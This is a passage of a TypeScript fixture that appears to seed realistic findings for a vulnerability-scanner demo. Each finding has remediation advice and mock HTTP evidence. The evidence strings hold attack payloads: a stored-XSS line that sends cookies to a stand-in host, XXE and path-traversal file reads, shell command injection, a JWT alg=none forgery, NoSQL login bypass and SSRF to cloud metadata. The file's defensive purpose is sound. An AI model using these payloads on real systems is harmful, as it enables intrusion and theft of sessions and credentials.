import type { Evidence, OwaspCategory, Severity } from '@/types/domain'

/**
 * Vulnerability catalogue used to seed realistic findings.
 * Every entry uses an OWASP Top 10 (2021) category and the CWE that MITRE maps to that weakness.
 * Evidence is raw HTTP so the evidence panel shows what a real scanner would capture.
 */
export interface VulnTemplate {
  key: string
  title: string
  severity: Severity
  category: OwaspCategory
  cwe: string
  location: string
  description: string
  remediation: string
  evidence: (host: string) => Evidence
}

const UA = 'User-Agent: clearsite-scanner/1.0'

export const VULNS: readonly VulnTemplate[] = [
  {
    key: 'sqli-search',
    title: 'SQL injection in product search',
    severity: 'critical',
    category: 'A03: Injection',
    cwe: 'CWE-89',
    location: 'GET /search?q=',
    description:
      'User input in the q parameter reaches the database query unsanitised. A single quote breaks the query and the database error is returned to the client, which confirms the injection point and leaks the database dialect.',
    remediation:
      'Use parameterised queries or prepared statements for every database call. Validate the q parameter against an allow-list of characters and a maximum length. Return a generic error page instead of database messages.',
    evidence: (h) => ({
      request: `GET /search?q=test%27 HTTP/1.1\nHost: ${h}\n${UA}\nAccept: text/html\nCookie: session=8f2c1e0b9a7d4f6e`,
      response: `HTTP/1.1 500 Internal Server Error\nContent-Type: text/html; charset=utf-8\nX-Powered-By: Express\n\n<pre>Error: ER_PARSE_ERROR: You have an error in your SQL syntax;\ncheck the manual that corresponds to your MySQL server version\nfor the right syntax to use near ''test'''' at line 1</pre>`,
    }),
  },
  {
    key: 'xss-reflected',
    title: 'Reflected XSS in order status page',
    severity: 'high',
    category: 'A03: Injection',
    cwe: 'CWE-79',
    location: 'GET /orders/status?ref=',
    description:
      "The ref parameter is written into the page without HTML encoding. An attacker can send a crafted link that runs script in the victim's session and reads their account data.",
    remediation:
      "Encode all untrusted output for the HTML context it lands in. Use the template engine's auto-escaping and remove raw-HTML helpers from this view. Add a Content-Security-Policy that blocks inline script.",
    evidence: (h) => ({
      request: `GET /orders/status?ref=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: ${h}\n${UA}\nAccept: text/html`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\n\n<div class="status">\n  No order found for <script>alert(document.domain)</script>\n</div>`,
    }),
  },
  {
    key: 'csrf-profile',
    title: 'Missing CSRF protection on profile update',
    severity: 'medium',
    category: 'A01: Broken Access Control',
    cwe: 'CWE-352',
    location: 'POST /account/profile',
    description:
      "The profile form accepts cross-site requests without an anti-CSRF token, and the session cookie has no SameSite attribute. A malicious page can change the victim's email address and take over the account through password reset.",
    remediation:
      'Require a per-session CSRF token on all state-changing requests. Set SameSite=Lax or Strict on the session cookie. Ask for the password again before changing the account email.',
    evidence: (h) => ({
      request: `POST /account/profile HTTP/1.1\nHost: ${h}\nOrigin: https://attacker.example\nContent-Type: application/x-www-form-urlencoded\nCookie: session=8f2c1e0b9a7d4f6e\n\nemail=attacker%40evil.example`,
      response: `HTTP/1.1 302 Found\nLocation: /account/profile?saved=1\nSet-Cookie: flash=Profile%20updated; Path=/`,
    }),
  },
  {
    key: 'csp-missing',
    title: 'Content-Security-Policy header not set',
    severity: 'medium',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-693',
    location: 'GET /',
    description:
      'No Content-Security-Policy is sent on HTML responses. Any injection flaw on the site can load and run arbitrary script with no second line of defence.',
    remediation:
      "Send a Content-Security-Policy on every HTML response. Start with default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none' and tighten it using report-only data.",
    evidence: (h) => ({
      request: `GET / HTTP/1.1\nHost: ${h}\n${UA}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nCache-Control: no-cache\nX-Frame-Options: SAMEORIGIN\n\n# no Content-Security-Policy header present`,
    }),
  },
  {
    key: 'cookie-httponly',
    title: 'Session cookie missing HttpOnly flag',
    severity: 'low',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-1004',
    location: 'POST /login',
    description:
      'The session cookie is readable from JavaScript. Combined with any XSS flaw, an attacker can steal the session token directly.',
    remediation:
      'Set HttpOnly, Secure and SameSite=Lax on the session cookie in the framework session config.',
    evidence: (h) => ({
      request: `POST /login HTTP/1.1\nHost: ${h}\nContent-Type: application/x-www-form-urlencoded\n\nemail=qa%40example.com&password=********`,
      response: `HTTP/1.1 302 Found\nLocation: /account\nSet-Cookie: session=8f2c1e0b9a7d4f6e; Path=/; Secure`,
    }),
  },
  {
    key: 'server-banner',
    title: 'Server version disclosed in response headers',
    severity: 'info',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-200',
    location: 'HEAD /',
    description:
      'Response headers reveal the exact web server and framework versions. This helps an attacker pick known exploits for those versions.',
    remediation: 'Remove or genericise the Server and X-Powered-By headers at the proxy or framework level.',
    evidence: (h) => ({
      request: `HEAD / HTTP/1.1\nHost: ${h}\n${UA}`,
      response: `HTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nX-Powered-By: Express 4.17.1\nContent-Type: text/html`,
    }),
  },
  {
    key: 'idor-orders',
    title: "IDOR exposes other customers' orders",
    severity: 'critical',
    category: 'A01: Broken Access Control',
    cwe: 'CWE-639',
    location: 'GET /api/orders/{id}',
    description:
      "Order IDs are sequential and the endpoint does not check that the order belongs to the caller. Any logged-in user can read every customer's name, address and order history by changing the ID.",
    remediation:
      'Enforce object-level authorisation on every request: load the order scoped to the current user and return 404 when it does not match. Use non-guessable identifiers as defence in depth.',
    evidence: (h) => ({
      request: `GET /api/orders/100482 HTTP/1.1\nHost: ${h}\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1XzIwMTkifQ.c2ln\nAccept: application/json`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":100482,"customer":"u_1877","name":"Priya Raman",\n "address":"14 Kestrel Way, Leeds","total":219.40,\n "items":[{"sku":"KB-204","qty":1}]}`,
    }),
  },
  {
    key: 'xss-stored',
    title: 'Stored XSS in product reviews',
    severity: 'high',
    category: 'A03: Injection',
    cwe: 'CWE-79',
    location: 'POST /api/reviews',
    description:
      'Review text is stored and later rendered as HTML on the product page. One malicious review runs script for every visitor, including staff using the admin view.',
    remediation:
      'Store the raw text and encode it on output. If rich text is needed, sanitise it on the server with a maintained allow-list sanitiser. Add a strict Content-Security-Policy.',
    evidence: (h) => ({
      request: `POST /api/reviews HTTP/1.1\nHost: ${h}\nContent-Type: application/json\n\n{"productId":"KB-204","rating":5,\n "body":"Great board <img src=x onerror=fetch('//x.example/'+document.cookie)>"}`,
      response: `HTTP/1.1 201 Created\nContent-Type: application/json\n\n{"id":"rv_8812","status":"published"}`,
    }),
  },
  {
    key: 'open-redirect',
    title: 'Open redirect after login',
    severity: 'medium',
    category: 'A01: Broken Access Control',
    cwe: 'CWE-601',
    location: 'GET /login?next=',
    description:
      'The next parameter accepts any absolute URL. Attackers can use the trusted domain to send victims to a phishing page right after they sign in.',
    remediation:
      'Only accept relative paths for next, or check the host against an allow-list before redirecting.',
    evidence: (h) => ({
      request: `GET /login?next=https://evil.example/login HTTP/1.1\nHost: ${h}\nCookie: session=8f2c1e0b9a7d4f6e`,
      response: `HTTP/1.1 302 Found\nLocation: https://evil.example/login`,
    }),
  },
  {
    key: 'jquery-outdated',
    title: 'Outdated jQuery 1.12.4 with known XSS flaws',
    severity: 'medium',
    category: 'A06: Vulnerable and Outdated Components',
    cwe: 'CWE-1104',
    location: 'GET /static/js/vendor/jquery.min.js',
    description:
      'The site loads jQuery 1.12.4, which is affected by CVE-2020-11022 and CVE-2020-11023. Passing untrusted HTML to jQuery DOM methods can run script.',
    remediation:
      'Upgrade to jQuery 3.7 or later and add dependency scanning to CI so outdated libraries fail the build.',
    evidence: (h) => ({
      request: `GET /static/js/vendor/jquery.min.js HTTP/1.1\nHost: ${h}\n${UA}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/javascript\n\n/*! jQuery v1.12.4 | (c) jQuery Foundation | jquery.org/license */\n!function(a,b){"object"==typeof module&&...`,
    }),
  },
  {
    key: 'verbose-errors',
    title: 'Stack traces returned in error responses',
    severity: 'low',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-209',
    location: 'GET /api/cart/undefined',
    description:
      'Unhandled exceptions return a full stack trace, including file paths and library versions. This maps the internals of the application for an attacker.',
    remediation:
      'Disable debug error pages in production. Log the stack trace on the server and return a generic error with a correlation ID.',
    evidence: (h) => ({
      request: `GET /api/cart/undefined HTTP/1.1\nHost: ${h}\nAccept: application/json`,
      response: `HTTP/1.1 500 Internal Server Error\nContent-Type: application/json\n\n{"error":"TypeError: Cannot read properties of null (reading 'items')",\n "stack":"at CartService.get (/srv/app/src/cart/service.js:48:19)"}`,
    }),
  },
  {
    key: 'hsts-missing',
    title: 'HSTS header missing',
    severity: 'low',
    category: 'A02: Cryptographic Failures',
    cwe: 'CWE-319',
    location: 'GET /',
    description:
      'Strict-Transport-Security is not set, so a user typing the bare domain can be downgraded to HTTP by a network attacker on the first request.',
    remediation:
      'Send Strict-Transport-Security: max-age=31536000; includeSubDomains on all HTTPS responses, then submit the domain for preload.',
    evidence: (h) => ({
      request: `GET / HTTP/1.1\nHost: ${h}\n${UA}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n# no Strict-Transport-Security header present`,
    }),
  },
  {
    key: 'bola-invoices',
    title: 'Broken object level authorisation on invoices',
    severity: 'critical',
    category: 'A01: Broken Access Control',
    cwe: 'CWE-639',
    location: 'GET /v2/invoices/{invoiceId}',
    description:
      'The invoice endpoint returns any invoice to any authenticated API client. Using a low-privilege tenant key, the scanner downloaded invoices that belong to other tenants, including bank details.',
    remediation:
      "Check tenant ownership in the data-access layer so every query is scoped by tenant ID. Add an automated test that requests another tenant's object and expects 404.",
    evidence: (h) => ({
      request: `GET /v2/invoices/inv_7Hq2LmX9 HTTP/1.1\nHost: ${h}\nAuthorization: Bearer sk_test_tenantB_4f8a\nAccept: application/json`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":"inv_7Hq2LmX9","tenant":"tenant_A","amount":48200,\n "currency":"EUR","iban":"DE89 3704 0044 0532 0130 00"}`,
    }),
  },
  {
    key: 'jwt-none',
    title: 'JWT accepted with alg=none',
    severity: 'high',
    category: 'A07: Identification and Authentication Failures',
    cwe: 'CWE-347',
    location: 'POST /v2/auth/refresh',
    description:
      'The token verifier accepts unsigned tokens when the header says alg=none. Anyone can create a token for any user ID and the API treats it as valid.',
    remediation:
      'Pin the expected algorithm, for example RS256, in the verifier and reject any token whose header disagrees. Upgrade the JWT library.',
    evidence: (h) => ({
      request: `POST /v2/auth/refresh HTTP/1.1\nHost: ${h}\nContent-Type: application/json\n\n{"token":"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJvd25lciJ9."}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"access_token":"eyJhbGciOiJSUzI1NiJ9...","sub":"admin","role":"owner"}`,
    }),
  },
  {
    key: 'mass-assignment',
    title: 'Mass assignment lets users set their own role',
    severity: 'high',
    category: 'A08: Software and Data Integrity Failures',
    cwe: 'CWE-915',
    location: 'PATCH /v2/users/me',
    description:
      'The user update endpoint binds the whole request body to the user model. Adding "role":"admin" to the payload promotes the caller to administrator.',
    remediation:
      'Bind only an explicit allow-list of fields from the request body. Handle role changes in a separate admin-only endpoint.',
    evidence: (h) => ({
      request: `PATCH /v2/users/me HTTP/1.1\nHost: ${h}\nAuthorization: Bearer sk_test_tenantB_4f8a\nContent-Type: application/json\n\n{"displayName":"qa","role":"admin"}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":"usr_2290","displayName":"qa","role":"admin"}`,
    }),
  },
  {
    key: 'rate-limit',
    title: 'No rate limiting on card verification',
    severity: 'medium',
    category: 'A04: Insecure Design',
    cwe: 'CWE-770',
    location: 'POST /v2/cards/verify',
    description:
      'The scanner sent 500 card verification requests in 30 seconds with no throttling. The endpoint can be used to test stolen card numbers.',
    remediation:
      'Rate-limit per API key and per IP, add back-off after failures, and alert on bursts of declines.',
    evidence: (h) => ({
      request: `POST /v2/cards/verify HTTP/1.1\nHost: ${h}\nContent-Type: application/json\n\n{"pan":"4000 0000 0000 0002","exp":"12/29","cvc":"***"}\n\n# request 500 of 500 in 30s`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"result":"declined","reason":"insufficient_funds"}\n\n# no 429 received`,
    }),
  },
  {
    key: 'tls-weak',
    title: 'TLS 1.0 and weak cipher suites enabled',
    severity: 'medium',
    category: 'A02: Cryptographic Failures',
    cwe: 'CWE-326',
    location: 'TLS :443',
    description:
      'The server still negotiates TLS 1.0 and CBC-mode ciphers with SHA-1. These are deprecated and open to downgrade attacks.',
    remediation:
      'Allow only TLS 1.2 and 1.3 with AEAD ciphers. Use the Mozilla "intermediate" configuration as a baseline.',
    evidence: (h) => ({
      request: `ClientHello\n  host: ${h}:443\n  version: TLS 1.0\n  ciphers: TLS_RSA_WITH_AES_128_CBC_SHA`,
      response: `ServerHello\n  version: TLS 1.0\n  cipher: TLS_RSA_WITH_AES_128_CBC_SHA\n# handshake completed`,
    }),
  },
  {
    key: 'audit-log',
    title: 'Failed logins are not logged',
    severity: 'low',
    category: 'A09: Security Logging and Monitoring Failures',
    cwe: 'CWE-778',
    location: 'POST /v2/auth/token',
    description:
      'Fifty failed authentication attempts produced no entries in the audit endpoint. A brute-force attack would go unnoticed.',
    remediation:
      'Log every authentication failure with timestamp, source IP and account. Ship the logs to the SIEM and alert on thresholds.',
    evidence: (h) => ({
      request: `GET /v2/audit?event=auth.failed&since=-10m HTTP/1.1\nHost: ${h}\nAuthorization: Bearer sk_test_admin_91c2`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"events":[],"count":0}\n\n# expected 50 auth.failed events`,
    }),
  },
  {
    key: 'cors-wildcard',
    title: 'CORS reflects any origin with credentials',
    severity: 'medium',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-942',
    location: 'OPTIONS /v2/*',
    description:
      "The API copies the request Origin into Access-Control-Allow-Origin and allows credentials. Any website can read authenticated API responses from a logged-in user's browser.",
    remediation:
      'Replace origin reflection with an explicit allow-list of trusted origins. Never combine a reflected origin with Allow-Credentials.',
    evidence: (h) => ({
      request: `OPTIONS /v2/invoices HTTP/1.1\nHost: ${h}\nOrigin: https://evil.example\nAccess-Control-Request-Method: GET`,
      response: `HTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET, POST, PATCH`,
    }),
  },
  {
    key: 'ssrf-webhook',
    title: 'SSRF through webhook URL reaches cloud metadata',
    severity: 'critical',
    category: 'A10: Server-Side Request Forgery',
    cwe: 'CWE-918',
    location: 'POST /integrations/webhooks/test',
    description:
      'The webhook tester fetches any URL on the server and returns the body. Pointing it at the cloud metadata service returned temporary credentials for the application role.',
    remediation:
      'Resolve and validate the destination before fetching. Block private, loopback and link-local ranges, allow only https, and enforce IMDSv2 on the instances. Do not return the fetched body to the user.',
    evidence: (h) => ({
      request: `POST /integrations/webhooks/test HTTP/1.1\nHost: ${h}\nContent-Type: application/json\n\n{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role"}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"status":200,"body":"{\\"AccessKeyId\\":\\"ASIA2EXAMPLE7Q\\",\\"SecretAccessKey\\":\\"wJalr...\\"}"}`,
    }),
  },
  {
    key: 'xxe-import',
    title: 'XML external entity injection in catalogue import',
    severity: 'high',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-611',
    location: 'POST /catalogue/import',
    description:
      'The XML parser resolves external entities. A crafted upload reads local files from the server and returns them in the import report.',
    remediation:
      'Disable DTD processing and external entity resolution in the XML parser. Prefer JSON for partner imports.',
    evidence: (h) => ({
      request: `POST /catalogue/import HTTP/1.1\nHost: ${h}\nContent-Type: application/xml\n\n<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<catalogue><item><sku>&x;</sku></item></catalogue>`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"imported":0,"errors":["Unknown SKU: root:x:0:0:root:/root:/bin/bash"]}`,
    }),
  },
  {
    key: 'session-fixation',
    title: 'Session ID not rotated after login',
    severity: 'medium',
    category: 'A07: Identification and Authentication Failures',
    cwe: 'CWE-384',
    location: 'POST /auth/login',
    description:
      "The pre-login session cookie stays valid after authentication. An attacker who plants a session ID can use the victim's session once they log in.",
    remediation:
      'Issue a new session ID on every privilege change, including login and logout, and invalidate the old one on the server.',
    evidence: (h) => ({
      request: `POST /auth/login HTTP/1.1\nHost: ${h}\nCookie: PSESSIONID=fixated-1234\nContent-Type: application/x-www-form-urlencoded\n\nuser=partner01&pass=********`,
      response: `HTTP/1.1 302 Found\nLocation: /dashboard\n\n# no new Set-Cookie: PSESSIONID=fixated-1234 is now authenticated`,
    }),
  },
  {
    key: 'password-policy',
    title: 'Weak password policy allows 6-character passwords',
    severity: 'low',
    category: 'A07: Identification and Authentication Failures',
    cwe: 'CWE-521',
    location: 'POST /auth/register',
    description:
      'Registration accepts short, common passwords such as "123456". These accounts are easy to brute force.',
    remediation:
      'Require at least 12 characters and check new passwords against a breached-password list, following NIST SP 800-63B.',
    evidence: (h) => ({
      request: `POST /auth/register HTTP/1.1\nHost: ${h}\nContent-Type: application/json\n\n{"email":"qa+1@example.com","password":"123456"}`,
      response: `HTTP/1.1 201 Created\nContent-Type: application/json\n\n{"id":"ptn_4471","status":"active"}`,
    }),
  },
  {
    key: 'user-enum',
    title: 'User enumeration through login error messages',
    severity: 'medium',
    category: 'A07: Identification and Authentication Failures',
    cwe: 'CWE-204',
    location: 'POST /auth/login',
    description:
      'The login page returns different messages for unknown accounts and wrong passwords, so attackers can confirm which partner emails exist.',
    remediation: 'Return one generic message for both cases and keep response timing consistent.',
    evidence: (h) => ({
      request: `POST /auth/login HTTP/1.1\nHost: ${h}\nContent-Type: application/x-www-form-urlencoded\n\nuser=ceo%40example.com&pass=wrong`,
      response: `HTTP/1.1 401 Unauthorized\nContent-Type: application/json\n\n{"error":"Incorrect password for ceo@example.com"}`,
    }),
  },
  {
    key: 'deserialization',
    title: 'Insecure deserialisation of session state',
    severity: 'high',
    category: 'A08: Software and Data Integrity Failures',
    cwe: 'CWE-502',
    location: 'Cookie: state',
    description:
      'A base64 Java serialised object in the state cookie is deserialised without integrity checks. A gadget-chain payload caused an outbound DNS lookup from the server.',
    remediation:
      'Never deserialise untrusted data. Keep session state on the server, or sign and encrypt it and use a safe format such as JSON.',
    evidence: (h) => ({
      request: `GET /dashboard HTTP/1.1\nHost: ${h}\nCookie: state=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTa...`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n# out-of-band DNS: a7f3.oob.clearsite.example resolved from 10.20.4.17`,
    }),
  },
  {
    key: 'default-creds',
    title: 'Default administrator credentials accepted',
    severity: 'critical',
    category: 'A07: Identification and Authentication Failures',
    cwe: 'CWE-1392',
    location: 'POST /admin/login',
    description:
      'The admin console accepts admin / admin. The scanner obtained full administrative access, including user management and configuration.',
    remediation:
      'Remove default accounts, force a unique password on first boot, and put the admin console behind SSO with MFA.',
    evidence: (h) => ({
      request: `POST /admin/login HTTP/1.1\nHost: ${h}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin`,
      response: `HTTP/1.1 302 Found\nLocation: /admin/overview\nSet-Cookie: admin_sid=3c9e...; Path=/admin; HttpOnly`,
    }),
  },
  {
    key: 'path-traversal',
    title: 'Path traversal in log download',
    severity: 'high',
    category: 'A01: Broken Access Control',
    cwe: 'CWE-22',
    location: 'GET /admin/logs/download?file=',
    description:
      'The file parameter is joined to the log directory without normalisation. ../ sequences read arbitrary files, including application secrets.',
    remediation:
      'Map downloads to an ID instead of a filename, or canonicalise the path and check that it stays inside the log directory.',
    evidence: (h) => ({
      request: `GET /admin/logs/download?file=../../../../srv/app/.env HTTP/1.1\nHost: ${h}\nCookie: admin_sid=3c9e...`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\nDATABASE_URL=postgres://admin:S3cr3t!@db.internal:5432/app\nSTRIPE_SECRET=sk_live_51H...`,
    }),
  },
  {
    key: 'cmd-injection',
    title: 'OS command injection in network diagnostics',
    severity: 'critical',
    category: 'A03: Injection',
    cwe: 'CWE-78',
    location: 'POST /admin/tools/ping',
    description:
      'The host field is passed to a shell. Appending ;id ran a command as the web server user, which gives remote code execution.',
    remediation:
      'Do not invoke a shell. Call the binary with an argument array, validate the host as an IP or hostname, and remove this tool from production.',
    evidence: (h) => ({
      request: `POST /admin/tools/ping HTTP/1.1\nHost: ${h}\nCookie: admin_sid=3c9e...\nContent-Type: application/json\n\n{"host":"127.0.0.1;id"}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"output":"PING 127.0.0.1 ... 1 packets received\\nuid=33(www-data) gid=33(www-data)"}`,
    }),
  },
  {
    key: 'clickjacking',
    title: 'Admin pages can be framed (clickjacking)',
    severity: 'low',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-1021',
    location: 'GET /admin/*',
    description:
      'Admin pages send neither X-Frame-Options nor a frame-ancestors directive, so they can be embedded in a hostile page to trick clicks.',
    remediation:
      "Send Content-Security-Policy: frame-ancestors 'none' (or X-Frame-Options: DENY) on all admin responses.",
    evidence: (h) => ({
      request: `GET /admin/users HTTP/1.1\nHost: ${h}\nCookie: admin_sid=3c9e...`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n# no X-Frame-Options or frame-ancestors present`,
    }),
  },
  {
    key: 'log-injection',
    title: 'Log injection through username field',
    severity: 'medium',
    category: 'A09: Security Logging and Monitoring Failures',
    cwe: 'CWE-117',
    location: 'POST /admin/login',
    description:
      'Newline characters in the username are written to the audit log as-is, letting an attacker forge log lines and hide activity.',
    remediation:
      'Encode or strip CR and LF before logging, and use structured JSON logging so fields cannot break out.',
    evidence: (h) => ({
      request: `POST /admin/login HTTP/1.1\nHost: ${h}\nContent-Type: application/x-www-form-urlencoded\n\nusername=bob%0a2026-10-28T10:00:00Z%20INFO%20login%20ok%20user=admin&password=x`,
      response: `HTTP/1.1 401 Unauthorized\n\n# audit.log now contains a forged "login ok user=admin" line`,
    }),
  },
  {
    key: 'dir-listing',
    title: 'Directory listing enabled on /backups/',
    severity: 'low',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-548',
    location: 'GET /backups/',
    description:
      'The web server lists the contents of /backups/, exposing the names and sizes of database dumps.',
    remediation: 'Turn off autoindex and move backups out of the web root.',
    evidence: (h) => ({
      request: `GET /backups/ HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Index of /backups/</h1>\n<a href="db-2026-10-01.sql.gz">db-2026-10-01.sql.gz</a>   148M`,
    }),
  },
  {
    key: 'debug-endpoint',
    title: 'Debug console exposed in staging build',
    severity: 'high',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-489',
    location: 'GET /__debug__/console',
    description:
      'An interactive framework debug console is reachable without authentication. It allows arbitrary code execution on the server.',
    remediation:
      'Build staging with debug tooling turned off, or restrict it to the VPN and require authentication.',
    evidence: (h) => ({
      request: `GET /__debug__/console HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<title>Interactive Console</title>\n<p>In this console you can execute Python expressions ...</p>`,
    }),
  },
  {
    key: 'ssrf-image',
    title: 'SSRF in image proxy reaches internal services',
    severity: 'high',
    category: 'A10: Server-Side Request Forgery',
    cwe: 'CWE-918',
    location: 'GET /img?src=',
    description:
      'The image proxy fetches any URL. The scanner reached an internal admin API on the private network through it.',
    remediation:
      'Allow-list image hosts, block private address ranges after DNS resolution, and refuse redirects to new hosts.',
    evidence: (h) => ({
      request: `GET /img?src=http://10.0.3.12:8080/internal/admin/health HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"service":"inventory-admin","version":"3.4.1","db":"ok"}`,
    }),
  },
  {
    key: 'hardcoded-key',
    title: 'Hard-coded signing secret in mobile config endpoint',
    severity: 'high',
    category: 'A02: Cryptographic Failures',
    cwe: 'CWE-798',
    location: 'GET /v1/config',
    description:
      'The public config endpoint used by the mobile app returns a server-side signing secret. Anyone can sign requests as the app.',
    remediation:
      'Rotate the secret now, remove it from client-facing config, and move request signing to the server.',
    evidence: (h) => ({
      request: `GET /v1/config HTTP/1.1\nHost: ${h}\nX-App-Version: 5.2.0`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"featureFlags":{"newCheckout":true},\n "hmacSecret":"b7f1c9e2a4d8406f9b3e5a1c7d2f8e60"}`,
    }),
  },
  {
    key: 'graphql-introspection',
    title: 'GraphQL introspection enabled',
    severity: 'low',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-200',
    location: 'POST /graphql',
    description:
      'Introspection returns the full schema, including internal mutations such as adminResetUser, which makes attack planning easier.',
    remediation: 'Turn off introspection outside development and enforce authorisation on every resolver.',
    evidence: (h) => ({
      request: `POST /graphql HTTP/1.1\nHost: ${h}\nContent-Type: application/json\n\n{"query":"{ __schema { mutationType { fields { name } } } }"}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"data":{"__schema":{"mutationType":{"fields":[\n {"name":"updateProfile"},{"name":"adminResetUser"},{"name":"issueRefund"}]}}}}`,
    }),
  },
  {
    key: 'nosql-injection',
    title: 'NoSQL operator injection bypasses login',
    severity: 'high',
    category: 'A03: Injection',
    cwe: 'CWE-943',
    location: 'POST /v1/auth/login',
    description:
      'The login handler passes JSON straight into a MongoDB query. Sending {"$ne": null} as the password logs in as the first user.',
    remediation:
      'Validate request bodies against a schema that only allows strings, and use a query builder that rejects operator keys.',
    evidence: (h) => ({
      request: `POST /v1/auth/login HTTP/1.1\nHost: ${h}\nContent-Type: application/json\n\n{"email":"admin@example.com","password":{"$ne":null}}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"token":"eyJhbGciOiJIUzI1NiJ9...","user":{"email":"admin@example.com","role":"admin"}}`,
    }),
  },
  {
    key: 'missing-auth',
    title: 'Unauthenticated access to account export',
    severity: 'critical',
    category: 'A01: Broken Access Control',
    cwe: 'CWE-306',
    location: 'GET /v1/internal/export',
    description:
      'An internal export endpoint is routed through the public gateway with no authentication. It streams every account record as CSV.',
    remediation:
      'Remove the route from the public gateway and require service-to-service authentication, such as mTLS or signed tokens, for internal APIs.',
    evidence: (h) => ({
      request: `GET /v1/internal/export?format=csv HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/csv\n\nid,email,phone,created_at\nu_1,ana@example.com,+44 7700 900123,2024-03-02\nu_2,li@example.com,+44 7700 900456,2024-03-02`,
    }),
  },
  {
    key: 'wp-plugin',
    title: 'Vulnerable WordPress plugin: Contact Form 7 5.3.1',
    severity: 'high',
    category: 'A06: Vulnerable and Outdated Components',
    cwe: 'CWE-1104',
    location: 'GET /wp-content/plugins/contact-form-7/readme.txt',
    description:
      'Contact Form 7 5.3.1 is affected by CVE-2020-35489, an unrestricted file upload that can lead to remote code execution.',
    remediation:
      'Update the plugin to the latest release, remove unused plugins, and turn on automatic security updates.',
    evidence: (h) => ({
      request: `GET /wp-content/plugins/contact-form-7/readme.txt HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/plain\n\n=== Contact Form 7 ===\nStable tag: 5.3.1\nRequires at least: 5.4`,
    }),
  },
  {
    key: 'sri-missing',
    title: 'Third-party scripts loaded without Subresource Integrity',
    severity: 'low',
    category: 'A08: Software and Data Integrity Failures',
    cwe: 'CWE-353',
    location: 'GET /',
    description:
      'Chat and analytics scripts load from third-party CDNs without integrity hashes. A compromised CDN could inject code into every page.',
    remediation:
      'Add integrity and crossorigin attributes to third-party script tags, or self-host the scripts.',
    evidence: (h) => ({
      request: `GET / HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<script src="https://cdn.widgets.example/chat.js"></script>\n<!-- no integrity attribute -->`,
    }),
  },
  {
    key: 'xss-dom',
    title: 'DOM-based XSS through location hash',
    severity: 'medium',
    category: 'A03: Injection',
    cwe: 'CWE-79',
    location: 'GET /campaign#',
    description:
      'Campaign page JavaScript writes location.hash into innerHTML. A crafted link runs script on the marketing domain.',
    remediation:
      'Use textContent instead of innerHTML for untrusted values, and add a CSP with Trusted Types.',
    evidence: (h) => ({
      request: `GET /campaign#<img src=x onerror=alert(1)> HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<script>\n  banner.innerHTML = decodeURIComponent(location.hash.slice(1))\n</script>`,
    }),
  },
  {
    key: 'mixed-content',
    title: 'Newsletter form posts to an HTTP endpoint',
    severity: 'low',
    category: 'A02: Cryptographic Failures',
    cwe: 'CWE-311',
    location: 'GET /newsletter',
    description:
      'The newsletter form on an HTTPS page posts to an HTTP URL, sending email addresses in clear text.',
    remediation: 'Change the form action to HTTPS and add upgrade-insecure-requests to the CSP.',
    evidence: (h) => ({
      request: `GET /newsletter HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<form action="http://lists.example.com/subscribe" method="post">`,
    }),
  },
  {
    key: 'robots-disclosure',
    title: 'robots.txt reveals hidden admin paths',
    severity: 'info',
    category: 'A05: Security Misconfiguration',
